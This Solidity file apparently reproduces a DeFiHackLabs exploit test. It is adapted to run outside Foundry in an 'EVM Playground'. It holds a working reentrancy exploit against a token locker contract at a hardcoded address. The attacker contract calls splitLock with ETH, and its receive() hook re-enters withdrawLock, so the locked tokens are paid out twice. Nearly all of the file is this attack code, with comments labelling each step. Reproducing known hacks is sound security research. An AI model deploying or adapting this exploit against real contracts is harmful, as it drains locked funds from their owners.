// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Bizness_exp.sol test's testExploit()/withdrawLock()/receive() logic verbatim,
// but without inheriting forge-std Test/BaseTestWithBalanceLog (which depends
// on the Foundry cheatcode contract being deployed; that address has no code
// in a plain EVM replay, so any cheatcode-gated modifier reverts before the
// real attack logic runs). The test's setUp() step (vm.prank(ATTACKER) +
// transferLock(11, exploit)) is replicated as a playground `setup` rawCall
// instead of a Solidity-level prank.

address constant LOCKER = 0x80b9C9C883e376c4aA43d72413aB1Bd6A64A0654;

contract Bizness {
    uint256 lockId = 11;

    function testExploit() public payable {
        ILocker locker = ILocker(LOCKER);

        Lock memory lockBefore = locker.locks(lockId);
        // Step 1: Split the lock to trigger reentrancy
        uint256 newSplitId = locker.splitLock{value: 0.011 ether}(lockId, lockBefore.amount - 1, 1735353747);

        // EXPLOIT RESULT:
        // - Original lock (lockId) is now withdrawn (empty)
        // - New lock (newSplitId) contains (lockBefore.amount - 1) tokens
        // - Contract balance increased by lockBefore.amount tokens
        Lock memory lockAfter = locker.locks(newSplitId);
    }

    function withdrawLock(uint256 _splitId) public {
        // Step 3: withdraw full locked amount
        ILocker locker = ILocker(LOCKER);
        locker.withdrawLock(_splitId);
    }

    receive() external payable {
        // Step 2: Reentrancy entry point
        withdrawLock(lockId);
    }
}

struct Lock {
    address token;
    uint256 tokenId;
    address beneficiary;
    uint256 amount;
    uint256 unlockTime;
    bool withdrawn;
}

interface ILocker {
    function locks(uint256 lockId) external view returns (Lock memory);
    function splitLock(
        uint256 _id,
        uint256 _newAmount,
        uint256 _newUnlockTime
    ) external payable returns (uint256 _splitId);
    function withdrawLock(uint256 _id) external;
    function transferLock(uint256 _id, address _newBeneficiary) external;
}
